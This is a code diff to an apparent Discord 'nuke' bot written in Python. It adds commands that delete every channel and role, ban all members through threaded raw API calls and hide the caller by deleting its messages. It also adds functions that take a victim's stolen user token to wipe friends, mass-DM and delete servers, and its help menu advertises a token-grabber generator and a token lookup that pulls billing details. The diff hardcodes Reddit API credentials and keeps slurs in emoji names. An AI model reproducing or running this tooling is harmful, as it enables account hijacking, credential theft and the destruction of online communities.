@@ -11,10 +11,13 @@ import marshal
 import string
 import socket
 import subprocess
+import threading
 import praw
 from config import TOKEN
 from utils.tokeninfo import tokeninfo
 from utils.shitlist import en, zh, ru, allat
+from utils.housechanger import hypesquadchanger
+from utils.userfunctions import remove_friends, block_friends, settings, dms_close, mass_dm, delete_servers
 from discord.ext import commands
 from discord.ui import Select
 
@@ -25,7 +28,10 @@ from discord.ui import Select
 # ++++++++++++++++               S. 10/17/2023              ++++++++++++++++ #
 
 
-                # ================ changelog ================ #   newer
+                # ================ changelog ================ #
+                # added more user token functions
+                # quick improvements on nuke functions            newer
+                # fixed massban
                 # add sum goofy shit                               🔽
                 # made help look better                           older
                 # added convert token grabber file to exe option
@@ -46,10 +52,9 @@ from discord.ui import Select
                 # ================ to do list ================ # 
                 # fix mass ban
                 # fix profile spy
-                # add user token functions
                 # add badges to token info,skid from https://github.com/Fadi002/Discord-Token-Info/blob/main/src/info.py
-                # add emojis
                 # turn everything to slash cmd
+                # turn everything to embeds
                 # ================ to do list ================ # 
 
 
@@ -68,8 +73,8 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 bot.remove_command('help')
 
-reddit = praw.Reddit(client_id='',
-                     client_secret='',
+reddit = praw.Reddit(client_id='yIcqdtiDh3HnDpM6BfOhPw',
+                     client_secret='rF14sOiRYNagEz-k6XwEqyZmxRqgVw',
                      user_agent='XOLOGANG111')
 
 
@@ -484,7 +489,8 @@ async def setstatus(ctx, status: str):
 
 
 @bot.command()
-async def flush(ctx, server_id=None):
+async def flush(ctx, server_id: int = None):
+    await ctx.message.delete()
     if server_id is None:
         server_id = ctx.guild.id
     try:
@@ -518,7 +524,7 @@ async def flush(ctx, server_id=None):
             await asyncio.gather(*tasks)
     except Exception as e:
         embaed = discord.Embed(title="", description=f":x:  Error: {e}", color=discord.Color.red())
-        await ctx.reply(embed=embaed)
+        await ctx.author.send(embed=embaed)
 
 
 
@@ -526,6 +532,7 @@ async def flush(ctx, server_id=None):
 
 @bot.command()
 async def customflush(ctx, server_id, channel_amount, channel_name, message_amount, *, message_content):
+    await ctx.message.delete()
     try:
         guild = bot.get_guild(int(server_id))
         if guild is not None:
@@ -546,24 +553,27 @@ async def customflush(ctx, server_id, channel_amount, channel_name, message_amou
 
             await asyncio.gather(*tasks)
 
-            await ctx.send("☑️ Operation complete.")
+            await ctx.author.send("☑️ Operation complete.")
         else:
             embaed = discord.Embed(title="", description=f":x:  Could not find server with ID {server_id}.", color=discord.Color.red())
             await ctx.reply(embed=embaed)
+
     except ValueError:
         embxdd = discord.Embed(title="", description=":x:  Invalid syntax.", color=discord.Color.red())
         await ctx.reply(embed=embxdd)
         
 @bot.command()
 async def purge(ctx, server_id: int = None):
+    await ctx.message.delete()
     if server_id is None:
         server_id = ctx.guild.id
+    servername = bot.get_guild(server_id).name
     try:
         guild = bot.get_guild(int(server_id))
         if guild is not None:
             for channel in guild.channels:
                 await channel.delete()
-            
+            await ctx.author.send(f"✅ All channels have been deleted in {servername}.")
         else:
             embxdzd = discord.Embed(title="", description=f":x:  Could not find server with ID {server_id}.", color=discord.Color.red())
             await ctx.reply(embed=embxdzd)
@@ -587,8 +597,6 @@ async def leave(ctx, server_id: int = None):
 
 @bot.command()
 async def link(ctx):
-    
-    await ctx.message.add_reaction("✔️")
 
     await ctx.reply("https://discord.com/api/oauth2/authorize?client_id=999232775443984495&permissions=8&scope=bot")
 
@@ -628,6 +636,7 @@ async def servlist(ctx):
 
 @bot.command()
 async def massping(ctx, server_id: int = None, message_amount: int = 5, *, message_content: str = ""):
+    await ctx.message.delete()
     if server_id is None:
         server_id = ctx.guild.id
     guild = bot.get_guild(server_id)
@@ -645,11 +654,10 @@ async def massping(ctx, server_id: int = None, message_amount: int = 5, *, messa
 
     await asyncio.gather(*tasks)
 
-    await ctx.message.add_reaction("✔️")
     
 
 @bot.command()
-async def clear(ctx, server_id=None):
+async def clear(ctx, server_id: int = None):
     if server_id is None:
         server_id = ctx.guild.id
     guild = bot.get_guild(server_id)
@@ -688,9 +696,11 @@ async def clearchannel(ctx, server_id: int, channel_id: int):
 
 
 @bot.command()
-async def rolepurge(ctx, server_id=None):
+async def rolepurge(ctx, server_id: int = None):
+    await ctx.message.delete()
     if server_id is None:
         server_id = ctx.guild.id
+    servername = bot.get_guild(server_id).name
     try:
         guild = bot.get_guild(int(server_id))
         if guild is None:
@@ -704,10 +714,10 @@ async def rolepurge(ctx, server_id=None):
             if role.name != "@everyone" and role != bot_role:
                 await role.delete()
         
-        await ctx.send("All deletable roles have been deleted.")
+        await ctx.author.send(f"✅ All deletable roles have been deleted in {servername}.")
     except discord.errors.Forbidden:
         pass
-        await ctx.send("All deletable roles have been deleted.")
+        await ctx.author.send(f"✅ All deletable roles have been deleted in {servername}.")
     except ValueError:
         await ctx.send("Invalid server ID format.")
 
@@ -745,18 +755,33 @@ async def unban(ctx, id: int):
 
 @bot.command()
 async def massban(ctx):
-    guild = ctx.guild
-    members = guild.members
+    global TOKEN
+    headers = {
+        "Authorization":
+            f"Bot {TOKEN}"
+    }
+    await ctx.message.delete()
+    serverid = ctx.guild.id
+
+    def mass_ban(i):
+        sessions = requests.Session()
+        sessions.put(
+            f"https://discord.com/api/v9/guilds/{serverid}/bans/{i}",
+            headers=headers
+        )
 
     try:
-        for member in members:
-            await guild.ban(member)
-            await asyncio.sleep(0.8)
-            
+        await ctx.author.send("⚙️ Starting.....")
+        for i in range(3):
+            for member in list(ctx.guild.members):
+                threading.Thread(
+                    target=mass_ban,
+                    args=(member.id,)
+                ).start()
+        servername = bot.get_guild(serverid).name
+        await ctx.author.send(f"✅ Banned all bannable users in {servername}.")
     except:
-        pass  
-
-    await ctx.send('Successfully banned all users.')
+        pass
 
 @bot.command()
 async def dm(ctx, userid, *, messagecontent):
@@ -781,10 +806,16 @@ async def webhookspam(ctx, webhook, msg):
 
 
 @bot.command()
+async def webhookdelete(ctx, webhook):
+    x = deletewebhook(webhook)
+    await ctx.reply(x)
+
+
+@bot.command()
 async def avatar(ctx, user: discord.User):
     avatar_url = user.avatar.url if user.avatar else user.default_avatar.url
-    embed = discord.Embed(title=f"Dis nigga {user.name}'s avatar", description="", color=discord.Color.gold())
-    embed.set_footer(text="amazing pfp")
+    embed = discord.Embed(title=f"{user.name}'s avatar", description="", color=discord.Color.gold())
+    embed.set_footer(text="Trash")
     embed.set_image(url=f"{avatar_url}")
     await ctx.reply(embed=embed)
 
@@ -1006,8 +1037,12 @@ async def help(ctx):
         placeholder = "📃 Choose a category",
         options=[
         discord.SelectOption(
-            label="Nuke", 
+            label="Server Nuke", 
             emoji="💣", 
+            description=""),
+        discord.SelectOption(
+            label="User Nuke",
+            emoji="🎠", 
             description=""),
         discord.SelectOption(
             label="Utils",
@@ -1026,8 +1061,8 @@ async def help(ctx):
             emoji="🤠", 
             description=""),
         discord.SelectOption(
-            label="Shit",
-            emoji="💩", 
+            label="Fun",
+            emoji="🤡", 
             description=""),
         discord.SelectOption(
             label="Github",
@@ -1037,15 +1072,15 @@ async def help(ctx):
     
     
     async def callback(interaction):
-        if select.values[0] == "Nuke":
-            help_embed = discord.Embed(title='Nuking', color=discord.Color.red())
+        if select.values[0] == "Server Nuke":
+            help_embed = discord.Embed(title='Server nuke functions', color=discord.Color.red())
             help_embed.add_field(name='💣 Flush', value=f'Nukes server\n`{bot.command_prefix}flush <serverid>`', inline=False)
             help_embed.add_field(name='🔫 Custom Flush', value=f'Creates channels and messages\n`{bot.command_prefix}customflush <serverid> <channelamount> <channelname> <messageamount> <messagecontent>`\nE.g. `{bot.command_prefix}customflush 1234567890 5 ExampleChannel 10 ExampleMessage`', inline=False)
             help_embed.add_field(name='🗑️ Purge', value=f'Deletes all channels\n`{bot.command_prefix}purge <serverid>`', inline=False)
             help_embed.add_field(name='😡 Mass Ping', value=f'Use if the bot does not have admin.\n`{bot.command_prefix}massping <serverid> <messageamount> <messagecontent>`', inline=False)
             help_embed.add_field(name='🧹 Clear Channel', value=f'Deletes all messages in a channel\n`{bot.command_prefix}clearchannel <serverid> <channelid>`', inline=False)
             help_embed.add_field(name='🚮 Role Purge (Cannot delete roles above the bot)', value=f'`{bot.command_prefix}rolepurge <serverid>`', inline=False)
-            help_embed.add_field(name='🔴 Mass Ban [Broken]', value=f'`{bot.command_prefix}massban <serverid>`', inline=False)
+            help_embed.add_field(name='🪓 Massban', value=f'Bans everyone in this server.`{bot.command_prefix}massban`', inline=False)
             help_embed.set_footer(text="Github: x9o")
 
             await interaction.response.send_message(embed=help_embed, ephemeral=True)
@@ -1093,6 +1128,7 @@ async def help(ctx):
         if select.values[0] == "Malicious":
             helpzembed = discord.Embed(title='Side features', color=discord.Color.dark_gold())
             helpzembed.add_field(name='🪝 Webhook Spammer', value=f'`{bot.command_prefix}webhookspam <webhook> <msgcontent>`', inline=False)
+            helpzembed.add_field(name='🗑️ Webhook Deleter', value=f'`{bot.command_prefix}webhookdelete <webhook>`', inline=False)
             helpzembed.add_field(name='🎠 Token grabber generator', value=f'Generates a token grabber in python. Also grabs IP, HWID, etc.\n`{bot.command_prefix}tokengrabber <webhook> <obfuscate: true/false> <mode: exe/py>`\nObfuscation is recommended for performance.\nEXE mode is unstable, I dont recommend using it.', inline=False)
             helpzembed.add_field(name='💸 Token Information', value=f'Provides full information on a user token. Billing info will also be grabbed if any.\n`{bot.command_prefix}tokinfo <token>`', inline=False)
             helpzembed.set_footer(text="Github: x9o")
@@ -1100,21 +1136,34 @@ async def help(ctx):
             await interaction.response.send_message(embed=helpzembed, ephemeral=True)
 
         if select.values[0] == "Misc":
-            xembed = discord.Embed(title='Info', color=discord.Color.blurple())
-            xembed.add_field(name='<:github:1168890688943968256> Github', value=f'Returns information of a github user\n`{bot.command_prefix}github <targetusername>`', inline=False)
-            xembed.add_field(name='<:niggawifi:1169653037804048384> IP Address', value=f'Returns information of an IP address with geolocation\n`{bot.command_prefix}ip <ipaddress>`', inline=False)
-            xembed.set_footer(text="Github: x9o")
+            xembedz = discord.Embed(title='Info', color=discord.Color.blurple())
+            xembedz.add_field(name='<:github:1168890688943968256> Github', value=f'Returns information of a github user\n`{bot.command_prefix}github <targetusername>`', inline=False)
+            xembedz.add_field(name='<:niggawifi:1169653037804048384> IP Address', value=f'Returns information of an IP address with geolocation\n`{bot.command_prefix}ip <ipaddress>`', inline=False)
+            xembedz.set_footer(text="Github: x9o")
 
-            await interaction.response.send_message(embed=xembed, ephemeral=True)
+            await interaction.response.send_message(embed=xembedz, ephemeral=True)
 
-        if select.values[0] == "Shit":
-            xembed = discord.Embed(title='Info', color=discord.Color.dark_magenta())
+        if select.values[0] == "Fun":
+            xembed = discord.Embed(title='Random stuff', color=discord.Color.dark_magenta())
             xembed.add_field(name='💩 Shitpost', value=f'Random post from reddit\n`{bot.command_prefix}shitpost <subreddit>`', inline=False)
             xembed.add_field(name='🦜 Yap', value=f'Say something interesting\n`{bot.command_prefix}yap <length> <lang: en/zh/all>`', inline=False)
             xembed.set_footer(text="Github: x9o")
 
             await interaction.response.send_message(embed=xembed, ephemeral=True)
 
+
+        if select.values[0] == "User Nuke":
+            xsembed = discord.Embed(title='User token functions', color=discord.Color.dark_gold())
+            xsembed.add_field(name='🗑️ Remove friends', value=f'\n`{bot.command_prefix}removefriends <token>`', inline=False)
+            xsembed.add_field(name='🛡️ Block friends', value=f'\n`{bot.command_prefix}blockfriends <token>`', inline=False)
+            xsembed.add_field(name='⚙️ Cycle settings', value=f'\n`{bot.command_prefix}cyclesettings <token>`', inline=False)
+            xsembed.add_field(name='🫠 Close DMS', value=f'\n`{bot.command_prefix}closedms <token>`', inline=False)
+            xsembed.add_field(name='🐝 Mass DM', value=f'\n`{bot.command_prefix}massdm <token> <msg>`', inline=False)
+            xsembed.add_field(name='🧻 Delete servers', value=f'\n`{bot.command_prefix}deleteservers <token>`', inline=False)
+            xsembed.add_field(name='💎 Hypesquad changer', value=f'\n`{bot.command_prefix}housechange <house> <token>`', inline=False)
+            xsembed.set_footer(text="Github: x9o")
+
+            await interaction.response.send_message(embed=xsembed, ephemeral=True)
 
         if select.values[0] == "Github":
             await ctx.reply("🤖 [Bot Repo](https://github.com/x9o/Bithub)\n🐦‍⬛ [Profile](https://github.com/x9o/)")
@@ -1126,6 +1175,52 @@ async def help(ctx):
     view.add_item(select)
 
     await ctx.send(embed=helprembed, view=view)
+
+
+# USER TOKEN FUNCTIONS #
+#=========================================================================================#
+
+@bot.command()
+async def housechange(ctx, house, token):
+    x = hypesquadchanger(house, token)
+    await ctx.reply(x)
+
+
+@bot.command()
+async def removefriends(ctx, token):
+    x = remove_friends(token)
+    await ctx.reply(x)
+
+@bot.command()
+async def blockfriends(ctx, token):
+    x = block_friends(token)
+    await ctx.reply(x)
+
+@bot.command()
+async def cyclesettings(ctx, token):
+    startmsg = await ctx.send("⚙️ Starting....")
+    x = settings(token)
+    if x:
+        await ctx.reply(x)
+        await startmsg.delete()
+    
+
+
+@bot.command()
+async def closedms(ctx, token):
+    x = dms_close(token)
+    await ctx.reply(x)
+
+@bot.command()
+async def massdm(ctx, token, msg):
+    x = mass_dm(token, msg)
+    await ctx.reply(x)
+
+
+@bot.command()
+async def deleteservers(ctx, token):
+    x = delete_servers(token)
+    await ctx.reply(x)
 
 
 #                    non bot functions                                      #
@@ -1185,6 +1280,16 @@ def webhookfuck(WebHook, Message):
             time.sleep(.01)
         except KeyboardInterrupt:
             break
+
+def deletewebhook(webhook):
+    try:
+        requests.delete(webhook.rstrip())
+        holder = "✅ Webhook has been deleted."
+        return holder
+    except:
+        holder = "❌ Webhook could not be deleted."
+        return holder
+
 
 def ipinfo(address):
     url = f"http://ip-api.com/json/{address}"
